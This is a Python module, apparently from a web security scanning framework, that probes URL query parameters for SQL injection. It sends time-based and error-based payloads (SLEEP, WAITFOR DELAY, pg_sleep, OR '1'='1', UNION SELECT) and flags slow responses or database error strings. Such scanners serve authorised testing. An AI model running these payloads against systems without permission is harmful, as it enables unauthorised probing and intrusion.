import time
import urllib.parse
from core.colors import Colors
from utils.helpers import quote

class NPXSQLiModule:
    def __init__(self, framework):
        self.framework = framework
        self.session = framework.session_manager
        self.vulnerabilities = []

    def test_time_based(self, url, param, value):
        payloads = ["' OR SLEEP(5)-- ", "' WAITFOR DELAY '00:00:05'-- ", "'; SELECT pg_sleep(5);-- "]
        for payload in payloads:
            injected = url.replace(f"{param}={value}", f"{param}={quote(payload)}")
            try:
                start = time.time()
                self.session.send_request("GET", injected)
                elapsed = time.time() - start
                if elapsed >= 4.0:
                    return injected, f"Time-based SQLi (Delay: {elapsed:.2f}s)"
            except:
                pass
        return None, None

    def test_error_based(self, url, param, value):
        payloads = ["'", "' OR '1'='1", "1' AND '1'='1", "\"", "\" OR \"1\"=\"1", "' UNION SELECT NULL-- "]
        for payload in payloads:
            injected = url.replace(f"{param}={value}", f"{param}={quote(payload)}")
            resp = self.session.send_request("GET", injected)
            if resp:
                content = resp.text.lower()
                indicators = ["sql syntax", "mysql_fetch", "you have an error in your sql",
                              "unclosed quotation mark", "error in your sql syntax",
                              "odbc", "driver", "database error"]
                for ind in indicators:
                    if ind in content:
                        return injected, f"Error-based SQLi: '{ind}'"
        return None, None

    def scan_parameters(self, url):
        parsed = urllib.parse.urlparse(url)
        query = parsed.query
        if not query:
            return
        for part in query.split('&'):
            if '=' in part:
                param, value = part.split('=', 1)
                if not value:
                    continue
                err_url, err_msg = self.test_error_based(url, param, value)
                if err_url:
                    self.vulnerabilities.append({'type': 'SQLi', 'url': err_url, 'details': err_msg, 'param': param})
                    return
                t_url, t_msg = self.test_time_based(url, param, value)
                if t_url:
                    self.vulnerabilities.append({'type': 'SQLi', 'url': t_url, 'details': t_msg, 'param': param})
                    return

    def run(self, target_urls):
        print(f"{Colors.OKCYAN}[*] Module: SQL Injection Scanner...{Colors.ENDC}")
        testable = [u for u in target_urls if '?' in u and '=' in u]
        print(f"{Colors.DIM}[*] Testing {len(testable)} URLs...{Colors.ENDC}")
        for url in testable:
            self.scan_parameters(url)
        if self.vulnerabilities:
            print(f"{Colors.FAIL}[+] Found {len(self.vulnerabilities)} SQLi vulnerabilities!{Colors.ENDC}")
            for v in self.vulnerabilities:
                print(f"  {Colors.FAIL}[!] {v['details']} at {v['url']}{Colors.ENDC}")
        else:
            print(f"{Colors.DIM}[-] No SQLi found.{Colors.ENDC}")
        return self.vulnerabilities
